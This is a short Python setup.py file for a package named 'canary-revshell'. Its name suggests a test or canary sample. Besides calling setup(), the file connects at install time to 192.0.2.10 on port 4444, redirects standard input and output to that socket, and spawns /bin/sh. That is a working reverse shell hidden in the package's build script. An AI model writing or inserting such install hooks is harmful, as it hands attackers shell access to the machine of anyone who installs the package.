import os, pty, socket
from setuptools import setup

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.0.2.10", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/sh")
setup(name="canary-revshell", version="0.0.1")
